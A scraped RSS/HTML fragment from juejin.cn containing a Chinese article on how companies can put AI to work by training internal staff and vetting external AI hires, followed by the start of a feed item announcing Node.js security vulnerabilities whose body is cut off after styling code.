strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>去年还有人问企业要不要拥抱AI，今年已经没人问了。问题变成了：怎么落地？谁来干？</p>
<p>很多企业的第一反应是招人——找一个既懂技术又懂业务的AI落地专家。想法没错，但这样的人才市场上很少，而且不是圈子里的人又很难甄别。</p>
<p><strong>我的建议是：先别急着外招，从内部培养一个懂业务的人。</strong></p>
<p>而且有了这样一个人，后续就算要招人，你也知道企业需要什么样的人，面试的时候也知道问什么样的问题。</p>
<hr/>
<h2 data-id="heading-0">为什么可行？</h2>
<p>技术门槛在快速降低。</p>
<p>现在国内已有1亿人在用豆包，写文案、做PPT已成基本技能。单纯会用AI毫无优势，真正有价值的是<strong>用AI深入业务、解决实际痛点</strong>。</p>
<p>换句话说：<strong>技术在进步，懂业务的人价值被放大了。</strong></p>
<p>以前需要懂代码才能开发，现在模型API已足够强大，很多程序已经可以通过文本沟通就能开发出来。这意味着，业务人员可以以很低的门槛上手做出自己专用的程序。</p>
<hr/>
<h2 data-id="heading-1">哪些人适合培养？</h2>
<p><strong>第一类：公司里最爱用AI的人</strong></p>
<p>每天都在用AI的人，和每月用一次的人，对工具的理解完全不同。主动性和手感，是培训不出来的。</p>
<p><strong>第二类：产品经理、项目经理</strong></p>
<p>这类人本就在梳理业务流程，清楚哪里卡顿、哪里低效、哪里重复劳动多。让他们带着问题学AI，效率最高。</p>
<p><strong>第三类：愿意折腾的一线员工</strong></p>
<p>让员工主动用AI解决手头问题。谁解决了，就让他做分享，给资源让他用AI解决更多问题。</p>
<hr/>
<h2 data-id="heading-2">怎么判断一个人行不行？</h2>
<p>很简单：<strong>看产出。</strong></p>
<p>让他做个东西出来，能解决问题就行，不能就换人。</p>
<p>不用搞复杂的评估体系。现在工具这么强，一试便知。</p>
<hr/>
<h2 data-id="heading-3">从哪里开始？</h2>
<p>AI落地不要一上来就搞大项目。先找那些<strong>高频重复、耗时、易出错</strong>的工作，这类任务最适合用AI解决，见效快、阻力小。</p>
<p>设计原则：<strong>能一个按钮解决的，就不要操作两次。</strong></p>
<p>举几个真实案例：</p>
<p><strong>财务对账</strong>
以前运营做一遍，财务再核对一遍。现在用对账工具，上传表格自动核算金额、去重、过滤状态变更订单，一键导出。两个部门都省力。</p>
<p><strong>退单统计</strong>
客服每天手动整理微信群退单信息到Excel，1-2人做一下午，易出错。用小工具自动识别快递单号、汇总到表格，支持撤回和导出，彻底解放人力。</p>
<p><strong>发票整理</strong>
自动按主体、进销项、普票专票分类并命名。人工整理半天，现在几秒搞定。</p>
<p>这些需求看似不起眼，但每天都在消耗人力。用AI做小工具，成本低、见效快，还能让团队感受到AI的实际价值。</p>
<hr/>
<h2 data-id="heading-4">如果要外招，怎么甄别？</h2>
<p>有些业务确实需要比较丰富的技术基础，需要外招AI落地负责人。但市场鱼龙混杂，如何甄别？</p>
<p><strong>1. 有没有真实落地案例？追问细节</strong></p>
<p>不要只听"我做过AI客服"。要追问：用什么模型？怎么处理并发？知识库如何构建？遇到什么坑？怎么解决的？真做过的人细节张口就来，包装的人一问就露馅。</p>
<p><strong>2. 有没有跨部门落地经验？</strong></p>
<p>给自己提效只是初级。能给财务、客服、运营、人事等不同部门都落地过，才证明此人有快速理解业务的能力。AI落地的难点不在技术，在业务逻辑的解构。</p>
<p><strong>3. 有没有总结复盘的习惯？</strong></p>
<p>写公众号、做分享、在社群输出过的人，说明他不只是执行，还复盘过、提炼过。这种人学习能力和表达能力都不会差。</p>
<p><strong>4. 沟通逻辑是否清晰？</strong></p>
<p>AI落地需要跟各部门打交道——需求沟通、方案讲解、问题排查，都需要清晰逻辑。面试时如果对方表达混乱，落地时大概率也一团糟。</p>
<p><strong>5. 使用AI的时长和频率</strong></p>
<p>越早用、用得越频繁越好。2023年就深度使用的人，和2025年才入门的人，体感和经验天差地别。可以问：用过哪些模型？不同模型区别是什么？踩过哪些坑？</p>
<p><strong>6. 有没有成本意识？</strong></p>
<p>AI落地追求的是业务最优，不是技术最优。真正有经验的人不会一上来就提买卡训练模型，那是大厂玩法。同时要明白，token价格会越来越便宜，应优先保证程序稳定性和可用性，而非过度计较单次成本。</p>
<p><strong>7. 有没有数据思维？</strong></p>
<p>落地后效果如何，不能靠感觉。要用数据说话：接待多少咨询？回复多少次？转化率多少？省了多少人力？数据会给出真实反馈，指引前进方向。</p>
<hr/>
<h2 data-id="heading-5">最后</h2>
<p>AI落地有快有慢，有做得好的和不好的，关键还是技术和业务的结合。外招一个大牛当然好，但等不到、看不准的时候，不如先从内部找一个愿意干、懂业务的人，让他边学边干。</p>
<p><strong>以用为学，是最快的学习方式。</strong></p>
<hr/>
<p>关于作者：石云升｜AI博主 &amp; AI企业落地师，专注企业AI落地与业务流程重构。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e6c49601add4fa8a87f42dd11668306~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z5LqR5Y2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086397&amp;x-signature=acvAcjUOY2olM9d1NrY3k78ezgc%3D" alt="image_w2752_h1536_签名图_16x9_v4.jpeg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀]]></title>    <link>https://juejin.cn/post/7595365551607808051</link>    <guid>https://juejin.cn/post/7595365551607808051</guid>    <pubDate>2026-01-15T11:07:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595365551607808051" data-draft-id="7595422019777560626" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀"/> <meta itemprop="keywords" content="Node.js,Vue.js,React.js"/> <meta itemprop="datePublished" content="2026-01-15T11:07:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="萌萌哒草头将军"/> <meta itemprop="url" content="https://juejin.cn/user/1116759543260727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759543260727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    萌萌哒草头将军
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:07:44.000Z" title="Thu Jan 15 2026 11:07:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body 